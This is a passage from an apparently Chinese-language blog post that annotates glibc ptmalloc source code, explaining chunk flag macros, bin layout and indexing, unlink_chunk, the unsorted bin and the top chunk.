class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 这个内联函数确保请求的大小 req 不会溢出 PTRDIFF_MAX。如果 req 大于 PTRDIFF_MAX，函数返回 false。否则，调用 request2size 计算可用大小，并将结果存储在 sz 中，最后返回 true */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span></span><br><span class="line"><span class="title function_">checked_request2size</span> <span class="params">(<span class="type">size_t</span> req, <span class="type">size_t</span> *sz)</span> __<span class="title function_">nonnull</span> <span class="params">(<span class="number">1</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (req &gt; PTRDIFF_MAX))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  *sz = request2size (req);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="chunk的物理操作"><a href="#chunk的物理操作" class="headerlink" title="chunk的物理操作"></a>chunk的物理操作</h2><p>即 A M P 哪几个标志位</p>
<p>这里的东西可以在分析代码逻辑时跳转回来看</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   --------------- Physical chunk operations ---------------</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size field is or&#x27;ed with PREV_INUSE when previous adjacent chunk in use */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREV_INUSE 0x1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* extract inuse bit of previous chunk */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_inuse(p)       ((p)-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size field is or&#x27;ed with IS_MMAPPED if the chunk was obtained with mmap() */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_MMAPPED 0x2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* check for mmap()&#x27;ed chunk */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size field is or&#x27;ed with NON_MAIN_ARENA if the chunk was obtained</span></span><br><span class="line"><span class="comment">   from a non-main arena.  This is only set immediately before handing</span></span><br><span class="line"><span class="comment">   the chunk to the user, if necessary.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NON_MAIN_ARENA 0x4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check for chunk from main arena.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_main_arena(p) (((p)-&gt;mchunk_size &amp; NON_MAIN_ARENA) == 0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Mark a chunk as not being on the main arena.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_non_main_arena(p) ((p)-&gt;mchunk_size |= NON_MAIN_ARENA)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   提取大小时需要屏蔽掉的位</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   注意：IS_MMAPPED 在那些不应看到内存映射块的宏中被故意保留在大小字段中。这会导致在扩展或改编这个 malloc 时，如果不小心尝试访问这些块，会产生有用的核心转储。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize_nomask(p)         ((p)-&gt;mchunk_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if !prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set the size of the chunk below P.  Only valid if !prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_prev_size(p, sz) ((p)-&gt;mchunk_prev_size = (sz))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ptr to previous physical malloc_chunk.  Only valid if !prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_chunk(p) ((mchunkptr) (((char *) (p)) - prev_size (p)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* extract p&#x27;s inuse bit */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> inuse(p)							      \</span></span><br><span class="line"><span class="meta">  ((((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* set/clear chunk as being inuse without otherwise disturbing */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_inuse(p)							      \</span></span><br><span class="line"><span class="meta">  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size |= PREV_INUSE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> clear_inuse(p)							      \</span></span><br><span class="line"><span class="meta">  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size &amp;= ~(PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* check/set/clear inuse bits in known places */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> inuse_bit_at_offset(p, s)					      \</span></span><br><span class="line"><span class="meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_inuse_bit_at_offset(p, s)					      \</span></span><br><span class="line"><span class="meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size |= PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> clear_inuse_bit_at_offset(p, s)					      \</span></span><br><span class="line"><span class="meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp;= ~(PREV_INUSE))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size at head, without disturbing its use bit */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_head_size(p, s)  ((p)-&gt;mchunk_size = (((p)-&gt;mchunk_size &amp; SIZE_BITS) | (s)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size/use field */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_head(p, s)       ((p)-&gt;mchunk_size = (s))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size at footer (only when chunk is not in use) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> GCC poison mchunk_size</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> GCC poison mchunk_prev_size</span></span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   -------------------- Internal data structures --------------------</span></span><br><span class="line"><span class="comment">   内部数据结构</span></span><br><span class="line"><span class="comment">   所有内部状态都保存在下面定义的 malloc_state 实例中。除了在两种可选情况下，没有其他静态变量：</span></span><br><span class="line"><span class="comment"> * 如果定义了 USE_MALLOC_LOCK，则上面声明的 mALLOC_MUTEx。</span></span><br><span class="line"><span class="comment"> * 如果 mmap 不支持 MAP_ANONYMOUS，则为 mmap 提供一个虚拟文件描述符。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   注意许多技巧旨在最小化总的记账空间需求。结果大约是 1K 字节（对于 4 字节指针和 size_t）。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Bins</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   一个用于free chunk的数组。每个bin都是双向链接的。bins之间的间隔大致成比例（对数）分布。bin的数量非常多（128个）。这看起来可能有些过多，但在实际使用中效果非常好。大多数bin所包含的大小在 malloc 请求中并不常见，但对于片段和合并的块组合来说却是比较常见的，这正是这些箱子所存储的内容，因此可以快速找到。所有过程都保持不变，即没有一个合并的块物理上与另一个合并的chunk相邻，因此列表中的每个chunk都知道其前后是使用中的chunk或内存的末尾。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   bins中的chunk按大小顺序排列，大小相同的chunk在近似最近使用的块中进行排序。对于small bins而言，排序并不是必须的，因为它们都包含相同大小的chunk，但对于较大的chunk，有助于最佳适配分配。这些列表只是顺序的。保持它们有序几乎从来不需要遍历到足以使用更复杂的有序数据结构的程度。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   相同大小的chunk以最近释放的chunk在前的顺序链接，分配则从后面取。这导致了 LRU（FIFO）分配顺序，这通常为每个chunk提供了与相邻释放的chunk合并的平等机会，从而产生了更大的自由块并减少了碎片化。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   为了简化在双向链表中的使用，每个箱头都充当 malloc_chunk。这避免了对头的特殊处理。但为了节省空间并改善局部性，我们仅分配箱子的 fd/bk 指针，然后利用重定位技巧将这些视为 malloc_chunk* 的字段。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mbinptr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 地址计算 -- 请注意， bin_at(0) 不存在 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bin_at(m, i) \</span></span><br><span class="line"><span class="meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))			      \</span></span><br><span class="line"><span class="meta">             - offsetof (struct malloc_chunk, fd))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ++bin 的类似物 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> next_bin(b)  ((mbinptr) ((char *) (b) + (sizeof (mchunkptr) &lt;&lt; 1)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 关于箱子内列表方向性的提醒 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> first(b)     ((b)-&gt;fd)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> last(b)      ((b)-&gt;bk)</span></span><br></pre></td></tr></table></figure>

<p><code>bin_at()</code> 是一个宏，用于通过给定的索引从内存管理器（<code>m</code>）的 <code>bins</code> 数组中获取特定的 bin（内存块管理单元）。它的实现依赖于 <code>offsetof</code>，计算出特定 bin 的地址，并进行适当的类型转换。</p>
<p><strong>参数说明：</strong></p>
<ul>
<li><code>m</code>: 这是一个指向内存管理结构的指针，通常是一个包含多个 bins 的结构体。</li>
<li><code>i</code>: 这是一个 bin 的索引，表示你想要获取的 bin 的位置（注意，索引是从 1 开始的，<code>bin_at(0)</code> 不存在）。</li>
</ul>
<p>宏 bin_at(m, i)通过 bin index 获得 bin 的链表头，chunk 中的fd 和 bk 用于将空闲 chunk 链入链表中，而对于每个 bin 的链表头，只需要这两个域就可以了，prev_size 和 size 对链表 都来说都没有意义，浪费空间，ptmalloc 为了节约这点内存空间，增大 cpu 高速缓存的命中 率，在 bins 数组中只为每个 bin 预留了两个指针的内存空间用于存放 bin 的链表头的 fb 和 bk 指针。 </p>
<p>从 bin_at(m, i)的定义可以看出，bin[0]不存在，以 SIZE_SZ 为 4B 的平台为例，bin[1]的前 4B 存储的是指针 fb，后 4B 存储的是指针 bk，而 bin_at 返回的是 malloc_chunk 的指针，由 于 fb 在 malloc_chunk 的偏移地址为 offsetof (struct malloc_chunk, fd))&#x3D;8，所以用 fb 的地址减 去 8 就得到 malloc_chunk 的地址。但切记，对 bin 的链表头的 chunk，一定不能修改 prev_size 和 size 域，这两个域是与其他 bin 的链表头的 fb 和 bk 内存复用的。 </p>
<p>宏 next_bin(b)用于获得下一个 bin 的地址，根据前面的分析，我们知道只需要将当前 bin 的地址向后移动两个指针的长度就得到下一个 bin 的链表头地址。 每个 bin 使用双向循环链表管理空闲 chunk，bin 的链表头的指针 fb 指向第一个可用的 chunk，指针 bk 指向最后一个可用的 chunk。宏 first(b)用于获得 bin 的第一个可用 chunk， 宏 last(b)用于获得 bin 的最后一个可用的 chunk，这两个宏便于遍历 bin，而跳过 bin 的链表 头。</p>
<h2 id="Indexing"><a href="#Indexing" class="headerlink" title="Indexing"></a>Indexing</h2><p>这段代码主要是根据chunk的size去计算出合适的bins。</p>
<p><strong>smallbin:</strong></p>
<p>ptmalloc使用small bins管理空闲小chunk，每个small bin中的chunk的大小与bin的index 有如下关系： Chunk_size&#x3D;2 * SIZE_SZ * index 在 SIZE_SZ 为 4B 的平台上，small bins 中的 chunk 大小是以 8B 为公差的等差数列，最大 的 chunk 大小为 504B，最小的 chunk 大小为 16B，所以实际共 62 个 bin。分别为 16B、24B、 32B，„„，504B。在 SIZE_SZ 为 8B 的平台上，small bins 中的 chunk 大小是以 16B 为公差 的等差数列，最大的 chunk 大小为 1008B，最小的 chunk 大小为 32B，所以实际共 62 个 bin。 分别为 32B、48B、64B，„„，1008B。 ptmalloc 维护了 62 个双向环形链表（每个链表都具有链表头节点，加头节点的最大作 用就是便于对链表内节点的统一处理，即简化编程），每一个链表内的各空闲 chunk 的大小 一致，因此当应用程序需要分配某个字节大小的内存空间时直接在对应的链表内取就可以了，这样 既可以很好的满足应用程序的内存空间申请请求而又不会出现太多的内存碎片。我们可 以用 如下图来表示在 SIZE_SZ 为 4B 的平台上 ptmalloc 对 512B 字节以下的空闲 chunk 组织方 式 （所谓的分箱机制）。</p>
<img data-src="../images/image-20250422212550966.png" alt="image-20250422212550966" style="zoom:50%;" />

<p><strong>largebin:</strong></p>
<p>在 SIZE_SZ 为 4B 的平台上，大于等于 512B的空闲 chunk，或者，在 SIZE_SZ 为 8B 的平 台上，大小大于等于 1024B的空闲 chunk，由sorted bins 管理。Large bins 一共包括 63 个 bin， 每个 bin 中的 chunk 大小不是一个固定公差的等差数列，而是分成 6 组 bin，每组 bin 是一个 固定公差的等差数列，每组的 bin 数量依次为 32、16、8、4、2、1，公差依次为 64B、512B、 4096B、32768B、262144B 等。 以 SIZE_SZ 为 4B 的平台为例，第一个 large bin 的起始 chunk 大小为 512B，共 32 个 bin， 公差为 64B，等差数列满足如下关系： Chunk_size&#x3D;512 + 64 * index 第二个 large bin的起始 chunk 大小为第一组 bin 的结束 chunk 大小，满足如下关系： Chunk_size&#x3D;512 + 64 * 32 + 512 * index 同理，我们可计算出每个 bin 的起始 chunk 大小和结束 chunk 大小。这些 bin 都是很有 规律的，其实small bins 也是满足类似规律，small bins 可以看着是公差为 8 的等差数列，一 共有 64 个 bin（第 0和 1bin 不存在），所以我们可以将 small bins 和 large bins存放在同一个 包含 128 个 chunk 的数组上，数组的前一部分位 small bins，后一部分为 large bins，每个 bin 的 index 为 chunk 数组的下标，于是，我们可以根据数组下标计算出该 bin 的 chunk 大小（small bins）或是 chunk 大小范围（large bins），也可以根据需要分配内存块大小计算出所需 chunk 所属 bin 的 index，ptmalloc 使用了一组宏巧妙的实现了这种计算。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Indexing</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Bins for sizes &lt; 512 bytes contain chunks of all the same size, spaced</span></span><br><span class="line"><span class="comment">    8 bytes apart. Larger bins are approximately logarithmically spaced:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    64 bins of size       8</span></span><br><span class="line"><span class="comment">    32 bins of size      64</span></span><br><span class="line"><span class="comment">    16 bins of size     512</span></span><br><span class="line"><span class="comment">     8 bins of size    4096</span></span><br><span class="line"><span class="comment">     4 bins of size   32768</span></span><br><span class="line"><span class="comment">     2 bins of size  262144</span></span><br><span class="line"><span class="comment">     1 bin  of size what&#x27;s left</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    There is actually a little bit of slop in the numbers in bin_index</span></span><br><span class="line"><span class="comment">    for the sake of speed. This makes no difference elsewhere.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The bins top out around 1MB because we expect to service large</span></span><br><span class="line"><span class="comment">    requests via mmap.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Bin 0 does not exist.  Bin 1 is the unordered list; if that would be</span></span><br><span class="line"><span class="comment">    a valid chunk size the small bins are bumped up one.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NBINS             128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NSMALLBINS         64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> in_smallbin_range(sz)  \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span></span><br><span class="line"><span class="meta">   + SMALLBIN_CORRECTION)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_32(sz)                                                \</span></span><br><span class="line"><span class="meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="string">&lt;= 38) ?  56 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span></span><br><span class="line"><span class="meta">   126)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_32_big(sz)                                            \</span></span><br><span class="line"><span class="meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="string">&lt;= 45) ?  49 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span></span><br><span class="line"><span class="meta">   126)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// XXX It remains to be seen whether it is good to keep the widths of</span></span><br><span class="line"><span class="comment">// XXX the buckets the same or whether it should be scaled by a factor</span></span><br><span class="line"><span class="comment">// XXX of two as well.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_64(sz)                                                \</span></span><br><span class="line"><span class="meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="string">&lt;= 48) ?  48 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span></span><br><span class="line"><span class="meta">   126)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index(sz) \</span></span><br><span class="line"><span class="meta">  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \</span></span><br><span class="line"><span class="meta">   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \</span></span><br><span class="line"><span class="meta">   : largebin_index_32 (sz))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((in_smallbin_range (sz)) ? smallbin_index (sz) : largebin_index (sz))</span></span><br></pre></td></tr></table></figure>

<p>宏bin_index(sz)根据所需内存大小计算出所需 bin 的 index，如果所需内存大小属于 small bins 的大小范围，调用 smallbin_index(sz)，否则调用 largebin_index(sz))。smallbin_index(sz) 的计算相当简单，如果 SIZE_SZ 为 4B，则将 sz 除以 8，如果 SIZE_SZ 为 8B，则将 sz 除以 16， 也就是除以small bins 中等差数列的公差。largebin_index(sz)的计算相对复杂一些，可以用如 下的表格直观的显示 chunk 的大小范围与 bin index 的关系。</p>
<h2 id="unlink-chunk"><a href="#unlink-chunk" class="headerlink" title="unlink_chunk"></a>unlink_chunk</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk; <span class="comment">//unlink操作的利用点</span></span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">	  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">	malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">	    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">	  <span class="keyword">else</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">	      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">	      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">	      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">	  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Unsorted-bin"><a href="#Unsorted-bin" class="headerlink" title="Unsorted_bin"></a>Unsorted_bin</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Unsorted chunks</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   所有从内存块拆分而来的剩余部分，以及所有被释放的内存块，</span></span><br><span class="line"><span class="comment">   首先都会被放置在“未排序” bin 中。在 malloc 函数给它们</span></span><br><span class="line"><span class="comment">   一次使用的机会之前，这些块将不会被移入常规的 bin。因此，</span></span><br><span class="line"><span class="comment">   基本上，未排序的内存块列表充当一个队列，内存块在 free（和</span></span><br><span class="line"><span class="comment">   malloc_consolidate）时被放入该队列，而在 malloc 时被取出（要么</span></span><br><span class="line"><span class="comment">   被使用，要么放入常规的 bin）。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   对于未排序的内存块，NON_MAIN_ARENA 标志永远不会被设置，</span></span><br><span class="line"><span class="comment">   因此在大小比较时不需要考虑这个标志。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unsorted_chunks(M)          (bin_at (M, 1))</span></span><br></pre></td></tr></table></figure>

<h2 id="Top"><a href="#Top" class="headerlink" title="Top"></a>Top</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Top</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   最上方可用的内存块（即，靠近可用内存末尾的块）被特殊处理。</span></span><br><span class="line"><span class="comment">   它从不被包含在任何 bin 中，仅在没有其他块可用时使用，</span></span><br><span class="line"><span class="comment">   如果它非常大，则会被释放回系统（参见 M_TRIM_THRESHOLD）。</span></span><br><span class="line"><span class="comment">   因为初始的 top 指向自身的 bin，初始大小为零，这样在第一次</span></span><br><span class="line"><span class="comment">   malloc 请求时强制进行扩展，从而避免在 malloc 中需要任何</span></span><br><span class="line"><span class="comment">   特殊代码来检查它是否已经存在。但是，在从系统获取内存时</span></span><br><span class="line"><span class="comment">   我们仍然需要这样做，因此在初始化和第一次调用 sysmalloc </span></span><br><span class="line"><span class="comment">   之间，我们让 initial_top 将 bin 视为在此期间合法但不可用的块。</span></span><br><span class="line"><span class="comment">   （这有点微妙，因为这依赖于在此期间前面的两个字都为零。）</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 方便的是，未排序的 bin 可以在第一次调用时作为虚拟的顶部 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> initial_top(M)              (unsorted_chunks (M))</span></span><br></pre></td></tr></table></figure>

<h2 id="Binmap"><a href="#Binmap" class="headerlink" title="Binmap"></a>Binmap</h2><p>记录一个块内chunk的状态</p>
